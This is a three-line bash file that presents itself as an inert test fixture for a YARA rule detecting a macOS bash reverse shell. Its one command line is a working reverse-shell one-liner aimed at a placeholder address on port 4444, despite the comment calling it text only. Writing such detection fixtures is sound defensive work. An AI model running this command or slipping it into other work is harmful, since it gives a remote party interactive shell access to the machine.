#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_Bash_Reverse_Shell - text only, not a working sample.
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
